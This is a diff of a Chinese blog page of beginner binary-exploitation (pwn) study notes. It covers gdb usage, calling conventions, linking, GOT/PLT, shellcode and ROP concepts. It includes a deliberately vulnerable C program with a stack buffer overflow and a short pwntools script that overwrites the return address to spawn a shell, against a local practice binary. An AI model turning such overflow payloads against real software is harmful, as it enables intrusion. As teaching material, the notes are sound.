@@ -16,12 +16,12 @@
   <meta name="author" content="D4wn">
   <meta name="keywords" content="后端,博客,网络安全,爬虫,D4wn,d4wnnn,脚本,Selenium,计算机网络,操作系统">
   
-    <meta name="description" content="Pwn环境配置安装python2.7: apt install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential 安装gdb,gdb-multiarch,同时安装binfmt(binfmt*)识别文件类型; 安装gdb插件pwndbg(github安装https:&#x2F;&#x2F;github.com&#x2F;pwndbg">
+    <meta name="description" content="Pwn 环境配置 安装python2.7: apt install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential 安装gdb,gdb-multiarch,同时安装binfmt(binfmt*)识别文件类型; 安装gdb插件pwndbg(github安装https:&#x2F;&#x2F;github.com">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Pwn">
 <meta property="og:url" content="https://d4wnnn.github.io/2022/10/11/Security/Pwn/index.html">
 <meta property="og:site_name" content="D4wn">
-<meta property="og:description" content="Pwn环境配置安装python2.7: apt install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential 安装gdb,gdb-multiarch,同时安装binfmt(binfmt*)识别文件类型; 安装gdb插件pwndbg(github安装https:&#x2F;&#x2F;github.com&#x2F;pwndbg">
+<meta property="og:description" content="Pwn 环境配置 安装python2.7: apt install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential 安装gdb,gdb-multiarch,同时安装binfmt(binfmt*)识别文件类型; 安装gdb插件pwndbg(github安装https:&#x2F;&#x2F;github.com">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://d4wnnn.github.io/img/article_img_1.jpg">
 <meta property="article:published_time" content="2022-10-11T12:36:13.000Z">
@@ -383,7 +383,7 @@ mjx-container[display="true"] + br {
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.5k 字
+          1.4k 字
         
       </span>
     
@@ -394,7 +394,7 @@ mjx-container[display="true"] + br {
         
         
         
-          13 分钟
+          12 分钟
         
       </span>
     
@@ -436,171 +436,187 @@ mjx-container[display="true"] + br {
             
               <div class="markdown-body">
                 
-                <h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>安装python2.7:</p>
+                <h1 id="pwn">Pwn</h1>
+<h2 id="环境配置">环境配置</h2>
+<p>安装python2.7:</p>
 <p><code>apt install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential</code></p>
 <p>安装<code>gdb</code>,<code>gdb-multiarch</code>,同时安装<code>binfmt</code>(<code>binfmt*</code>)识别文件类型;</p>
-<p>安装gdb插件<code>pwndbg</code>(github安装<a target="_blank" rel="noopener" href="https://github.com/pwndbg/pwndbg.git">https://github.com/pwndbg/pwndbg.git</a>)</p>
+<p>安装gdb插件<code>pwndbg</code>(github安装https://github.com/pwndbg/pwndbg.git)</p>
 <p>安装<code>pwntools</code></p>
 <p>安装<code>gcc-multilib</code>可以在64位linux下运行32位程序</p>
-<h2 id="Pwn基础理论"><a href="#Pwn基础理论" class="headerlink" title="Pwn基础理论"></a>Pwn基础理论</h2><p>在计算机中,当要表示的数据超出计算机所使用的数据的表示范围的时候,则产生数据的溢出.</p>
+<h2 id="pwn基础理论">Pwn基础理论</h2>
+<p>在计算机中,当要表示的数据超出计算机所使用的数据的表示范围的时候,则产生数据的溢出.</p>
 <p>产生的原因:</p>
-<ol>
+<ol type="1">
 <li>使用非类型安全的语言比如c/c++</li>
 <li>以不可靠的方式存取或者复制内存缓冲区</li>
 <li>编译器设置的内存缓冲区太靠近关键数据结构</li>
 </ol>
 <p>gdb的使用：</p>
 <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css">disass 反汇编<br><span class="hljs-selector-tag">b</span> *<span class="hljs-number">0</span>x080483f6 下断点<br>r 运行<br>delete 删除所有断点<br>start 从第一行运行<br><span class="hljs-selector-tag">i</span> <span class="hljs-selector-tag">b</span> 查看所有断点<br>d 编号 删除断点<br></code></pre></td></tr></table></figure>
-
 <p>miniconda安装：如果安装失败，可以通过bash安装而不是zsh</p>
 <p>如何查看当前是bash还是sh？echo $0</p>
 <p>如何让ubuntu 22.04通过本地root登录？</p>
 <p>在<code>/etc/pam.d/gdm-password和/etc/pam.d/gdm-autologin</code>注释掉<code>auth required pam_succeed_if.so user != root quiet_success</code></p>
 <p>在<code>/root/.profile</code>中注释<code>mesg n 2＞ /dev/null || true</code>,改为<code>tty -s &amp;&amp; mesg n || true</code></p>
 <p>如何检查程序保护情况？</p>
-<p>checksec –fiel=…</p>
+<p>checksec --fiel=...</p>
 <p>如何在编译时关闭保护？</p>
 <p><code>gcc -no-pie -fno-stack-protector -z execstack -m32 -o read read.c</code></p>
 <p>如何查看程序使用了哪些函数？</p>
 <p>objdump -t -j .text read</p>
 <p>-j 仅仅显示某一个段</p>
 <p>-t 显示符号表入口</p>
-<h2 id="基础篇"><a href="#基础篇" class="headerlink" title="基础篇"></a>基础篇</h2><h3 id="从汇编角度理解函数调用"><a href="#从汇编角度理解函数调用" class="headerlink" title="从汇编角度理解函数调用"></a>从汇编角度理解函数调用</h3><p>在调用一个函数时究竟发生了什么？</p>
+<h2 id="基础篇">基础篇</h2>
+<h3 id="从汇编角度理解函数调用">从汇编角度理解函数调用</h3>
+<p>在调用一个函数时究竟发生了什么？</p>
 <ul>
-<li>函数参数压栈<ul>
+<li>函数参数压栈
+<ul>
 <li>取地址</li>
 <li>压栈</li>
-</ul>
-</li>
+</ul></li>
 <li>返回地址压栈 这个在调用call的同时就执行了</li>
-<li>执行函数代码<ul>
+<li>执行函数代码
+<ul>
 <li>保存ebp</li>
 <li>开启新栈帧</li>
 <li>保护寄存器</li>
 <li>执行代码</li>
 <li>还原寄存器</li>
-</ul>
-</li>
+</ul></li>
 <li>平衡堆栈 找出之前的返回地址</li>
 </ul>
 <p>如果一个函数的参数数量大于6，那么参数1到6使用相应的寄存器<code>rdi rsi rdx rcx r8 r9</code>来传递，超出6的部分使用栈来传递</p>
 <p>使用寄存器进行参数传递时，寄存器的使用是有特殊顺序规定的：</p>
-<p><img src="/2022/10/11/Security/Pwn/image-20230114201005089.png" srcset="/img/loading.gif" lazyload alt="image-20230114201005089"></p>
+<figure>
+<img src="/2022/10/11/Security/Pwn/image-20230114201005089.png" srcset="/img/loading.gif" lazyload alt="image-20230114201005089">
+<figcaption aria-hidden="true">image-20230114201005089</figcaption>
+</figure>
 <p>此外，寄存器名字的使用取决于传递参数的大小，如果第一个参数大小是4字节，需要用寄存器edi来保存</p>
-<h3 id="编译的过程"><a href="#编译的过程" class="headerlink" title="编译的过程?"></a>编译的过程?</h3><ul>
+<h3 id="编译的过程">编译的过程?</h3>
+<ul>
 <li>首先预处理器cpp将main.c翻译成ascii的中间文件main.i(在某些gcc版本中,预处理器被集成到编译器内部)</li>
 <li>然后c编译器cc1将main.i翻译成ascii的汇编语言main.s</li>
 <li>然后汇编器as将main.s翻译为可重定位目标文件main.o</li>
 <li>最后链接器进行链接</li>
 </ul>
 <p>接下来我们详细的看一下链接部分</p>
-<p>首先感谢好文章<a target="_blank" rel="noopener" href="https://hansimov.gitbook.io/csapp/part2/ch07-linking/7.4-relocatable-object-files">7.4 可重定位目标文件 - 深入理解计算机系统（CSAPP） (gitbook.io)</a></p>
+<p>首先感谢好文章<a target="_blank" rel="noopener" href="https://hansimov.gitbook.io/csapp/part2/ch07-linking/7.4-relocatable-object-files">7.4
+可重定位目标文件 - 深入理解计算机系统（CSAPP） (gitbook.io)</a></p>
 <ul>
-<li>为了链接,链接器必须进行两部分工作<ul>
+<li><p>为了链接,链接器必须进行两部分工作</p>
+<ul>
 <li>符号解析</li>
 <li>重定位</li>
-</ul>
-</li>
-<li>目标文件有三种<ul>
+</ul></li>
+<li><p>目标文件有三种</p>
+<ul>
 <li>可重定位目标文件</li>
 <li>可执行目标文件</li>
 <li>共享目标文件</li>
+</ul></li>
+<li><figure>
+<img src="/2022/10/11/Security/Pwn/assets%2F-MHt_spaxGgCbp2POnfq%2F-MI8p7rbEV-s_nV5Ru6X%2F-MI8pJh5IxzFL80HMTY3%2F07-03%20典型的ELF可重定位目标文件.png" srcset="/img/loading.gif" lazyload alt="img">
+<figcaption aria-hidden="true">img</figcaption>
+</figure></li>
+<li><p>上面的<code>symtab</code>是一个符号表,存放程序中定义和引用的函数和全局变量信息</p></li>
 </ul>
-</li>
-<li>![img](Pwn/assets%2F-MHt_spaxGgCbp2POnfq%2F-MI8p7rbEV-s_nV5Ru6X%2F-MI8pJh5IxzFL80HMTY3%2F07-03 典型的ELF可重定位目标文件.png)</li>
-<li>上面的<code>symtab</code>是一个符号表,存放程序中定义和引用的函数和全局变量信息</li>
-</ul>
-<h3 id="如何理解GOT和PLT"><a href="#如何理解GOT和PLT" class="headerlink" title="如何理解GOT和PLT?"></a>如何理解GOT和PLT?</h3><ul>
+<h3 id="如何理解got和plt">如何理解GOT和PLT?</h3>
+<ul>
 <li><p>首先要明确一下链接库的概念，链接库分为两种</p>
 <ul>
 <li><p>动态链接库</p>
 <p>在win中后缀为dll，在linux中为.so</p>
-<p>动态链接库在编译时并不编译进程序,而是在程序运行时进行调用,性能虽然不高,但是软件的体积较小</p>
-</li>
+<p>动态链接库在编译时并不编译进程序,而是在程序运行时进行调用,性能虽然不高,但是软件的体积较小</p></li>
 <li><p>静态链接库</p>
 <p>在win中后缀为.lib 在linxu中为.a</p>
-<p>静态链接库在编译时代码并入程序,造成程序体积庞大 但是性能较高 不依赖任何第三方库</p>
-</li>
+<p>静态链接库在编译时代码并入程序,造成程序体积庞大 但是性能较高
+不依赖任何第三方库</p></li>
+</ul></li>
 </ul>
-</li>
-</ul>
-<h3 id="如何理解shellcode？"><a href="#如何理解shellcode？" class="headerlink" title="如何理解shellcode？"></a>如何理解shellcode？</h3><ul>
+<h3 id="如何理解shellcode">如何理解shellcode？</h3>
+<ul>
 <li><p>shellcode对应的C语言代码一般是<code>system("/bin/sh")</code>,但是在底层调用的是<code>sysexecve()</code></p>
 <ul>
-<li><p>接收三个参数：</p>
-</li>
-<li><p>filename</p>
-</li>
-<li><p>argv</p>
-</li>
-<li><p>envp 表示传递给程序的环境变量的字符串数组</p>
-</li>
-</ul>
-</li>
-<li><p>比较好的文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/A951860555/article/details/110936441">linux环境下shellcode的编写：32位和64位___lifanxin的博客-CSDN博客</a></p>
-</li>
+<li><p>接收三个参数：</p></li>
+<li><p>filename</p></li>
+<li><p>argv</p></li>
+<li><p>envp 表示传递给程序的环境变量的字符串数组</p></li>
+</ul></li>
+<li><p>比较好的文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/A951860555/article/details/110936441">linux环境下shellcode的编写：32位和64位___lifanxin的博客-CSDN博客</a></p></li>
 <li><p>如何利用python把字符串和16进制数字相互转换？</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">"sh/"</span>.encode().<span class="hljs-built_in">hex</span>())<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">"73682f"</span>).decode())<br></code></pre></td></tr></table></figure></li>
 </ul>
-<h3 id="实战-溢出实例"><a href="#实战-溢出实例" class="headerlink" title="实战-溢出实例"></a>实战-溢出实例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">exploit</span><span class="hljs-params">()</span><br>{<br>    system(<span class="hljs-string">"/bin/sh"</span>);<br>}<br><span class="hljs-type">void</span> <span class="hljs-title function_">func</span><span class="hljs-params">()</span><br>{<br>    <span class="hljs-type">char</span> str[<span class="hljs-number">0x20</span>];<br>    read(<span class="hljs-number">0</span>, str, <span class="hljs-number">0x50</span>);<br>}<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>{<br>    func();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></table></figure>
-
+<h3 id="实战-溢出实例">实战-溢出实例</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">exploit</span><span class="hljs-params">()</span><br>{<br>    system(<span class="hljs-string">"/bin/sh"</span>);<br>}<br><span class="hljs-type">void</span> <span class="hljs-title function_">func</span><span class="hljs-params">()</span><br>{<br>    <span class="hljs-type">char</span> str[<span class="hljs-number">0x20</span>];<br>    read(<span class="hljs-number">0</span>, str, <span class="hljs-number">0x50</span>);<br>}<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>{<br>    func();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></table></figure>
 <p>我们的最终目的是执行exploit函数</p>
 <p>首先我们执行<code>checksec --file=read2</code>查看程序保护情况</p>
 <p>然后我们通过objdump -t -j .text read2查看代码段有多少函数</p>
-<p><img src="/2022/10/11/Security/Pwn/image-20230112165245701.png" srcset="/img/loading.gif" lazyload alt="image-20230112165245701"></p>
+<figure>
+<img src="/2022/10/11/Security/Pwn/image-20230112165245701.png" srcset="/img/loading.gif" lazyload alt="image-20230112165245701">
+<figcaption aria-hidden="true">image-20230112165245701</figcaption>
+</figure>
 <p>观察到有三个函数，最终我们的目的是执行exploit函数</p>
 <p>然后我们进入调试</p>
 <p>输入start开始逐步调试程序</p>
-<p><img src="/2022/10/11/Security/Pwn/image-20230112165447968.png" srcset="/img/loading.gif" lazyload alt="image-20230112165447968"></p>
+<figure>
+<img src="/2022/10/11/Security/Pwn/image-20230112165447968.png" srcset="/img/loading.gif" lazyload alt="image-20230112165447968">
+<figcaption aria-hidden="true">image-20230112165447968</figcaption>
+</figure>
 <p>注意看此时的ebp和esp是指向同一地址，注意栈帧的变化</p>
 <p>单步运行：n</p>
 <p>通过disass exploit查看函数得到地址<code>0x08049186</code></p>
 <p>然后运行脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">"read"</span>)<br>offset = <span class="hljs-number">0x28</span> + <span class="hljs-number">0x4</span><br>payload = <span class="hljs-string">'a'</span> * offset + p32(<span class="hljs-number">0x08049186</span>)<br><span class="hljs-comment"># p32是将数字变为字符</span><br>p.sendline(payload)  <span class="hljs-comment"># 发送payload</span><br>p.interactive()  <span class="hljs-comment"># 获取运行时环境</span><br></code></pre></td></tr></table></figure>
-
-<h3 id="Cannary保护"><a href="#Cannary保护" class="headerlink" title="Cannary保护"></a>Cannary保护</h3><p><img src="/2022/10/11/Security/Pwn/image-20230114125951607.png" srcset="/img/loading.gif" lazyload alt="image-20230114125951607"></p>
-<h2 id="进阶篇"><a href="#进阶篇" class="headerlink" title="进阶篇"></a>进阶篇</h2><h3 id="Rop-Ret2Text介绍及插件配置"><a href="#Rop-Ret2Text介绍及插件配置" class="headerlink" title="Rop-Ret2Text介绍及插件配置"></a>Rop-Ret2Text介绍及插件配置</h3><ul>
-<li><p>ret2text就是执行程序中的已有代码</p>
-</li>
+<h3 id="cannary保护">Cannary保护</h3>
+<figure>
+<img src="/2022/10/11/Security/Pwn/image-20230114125951607.png" srcset="/img/loading.gif" lazyload alt="image-20230114125951607">
+<figcaption aria-hidden="true">image-20230114125951607</figcaption>
+</figure>
+<h2 id="进阶篇">进阶篇</h2>
+<h3 id="rop-ret2text介绍及插件配置">Rop-Ret2Text介绍及插件配置</h3>
+<ul>
+<li><p>ret2text就是执行程序中的已有代码</p></li>
 <li><p>如何使用pwndbg快速定位溢出偏移?</p>
-<p><code>cyclic -l 报错地址</code></p>
-</li>
+<p><code>cyclic -l 报错地址</code></p></li>
 <li><p>如何使用peda快速定位溢出偏移?</p>
 <p><code>pattern create 200</code></p>
-<p><code>pattern offset 0x63561</code></p>
-</li>
+<p><code>pattern offset 0x63561</code></p></li>
 </ul>
-<h3 id="Rop-Ret2Text实例讲解"><a href="#Rop-Ret2Text实例讲解" class="headerlink" title="Rop-Ret2Text实例讲解"></a>Rop-Ret2Text实例讲解</h3><ul>
-<li><pre><code class="shell">objdump -t 查看程序中使用的函数
-objdump -d 查看函数的汇编代码
-objdump -d -j .plt 查看plt表
+<h3 id="rop-ret2text实例讲解">Rop-Ret2Text实例讲解</h3>
+<ul>
+<li><pre class="shell"><code>  objdump -t 查看程序中使用的函数
+  objdump -d 查看函数的汇编代码
+  objdump -d -j .plt 查看plt表
     -j的参数有 .text .data .const .bss
-objdump -d -M intel查看函数的汇编代码 并且数intel架构的
-</code></pre>
-</li>
-<li><p>gdb attach 你的pid 附加进程调试</p>
-</li>
+  objdump -d -M intel查看函数的汇编代码 并且数intel架构的</code></pre></li>
+<li>gdb attach 你的pid 附加进程调试</li>
 </ul>
-<h3 id="Rop-Ret2Shellcode-32位实例"><a href="#Rop-Ret2Shellcode-32位实例" class="headerlink" title="Rop-Ret2Shellcode-32位实例"></a>Rop-Ret2Shellcode-32位实例</h3><ul>
-<li>ret2text依赖于程序中存在<code>system('bin/sh')</code>的函数</li>
-<li>ret2shellcode必须不开启nx保护</li>
-<li>shellcode就是用于实现特定功能的汇编代码,通常是开启一个shell</li>
-<li><img src="/2022/10/11/Security/Pwn/image-20230117123645746.png" srcset="/img/loading.gif" lazyload alt="image-20230117123645746"><ul>
-<li><img src="/2022/10/11/Security/Pwn/image-20230117135932344.png" srcset="/img/loading.gif" lazyload alt="image-20230117135932344"></li>
-</ul>
-</li>
-<li>shellcode获取的两种方式<ul>
+<h3 id="rop-ret2shellcode-32位实例">Rop-Ret2Shellcode-32位实例</h3>
+<ul>
+<li><p>ret2text依赖于程序中存在<code>system('bin/sh')</code>的函数</p></li>
+<li><p>ret2shellcode必须不开启nx保护</p></li>
+<li><p>shellcode就是用于实现特定功能的汇编代码,通常是开启一个shell</p></li>
+<li><figure>
+<img src="/2022/10/11/Security/Pwn/image-20230117123645746.png" srcset="/img/loading.gif" lazyload alt="image-20230117123645746">
+<figcaption aria-hidden="true">image-20230117123645746</figcaption>
+</figure>
+<ul>
+<li><img src="/2022/10/11/Security/Pwn/image-20230117135932344.png" srcset="/img/loading.gif" lazyload title="fig:" alt="image-20230117135932344"></li>
+</ul></li>
+<li><p>shellcode获取的两种方式</p>
+<ul>
 <li>手写</li>
 <li>pwntools生成</li>
-</ul>
-</li>
-<li>nx又称dep,即数据执行保护,可写的不可执行,可执行的不可写</li>
-<li>查看要拷贝的那个地址所在的段<ul>
+</ul></li>
+<li><p>nx又称dep,即数据执行保护,可写的不可执行,可执行的不可写</p></li>
+<li><p>查看要拷贝的那个地址所在的段</p>
+<ul>
 <li>gdb中readelf</li>
 <li>shell中readelf -S</li>
-</ul>
-</li>
-<li>gdb中的vmmap是查看程序的各种段的地址和范围的</li>
+</ul></li>
+<li><p>gdb中的vmmap是查看程序的各种段的地址和范围的</p></li>
 </ul>
 
                 
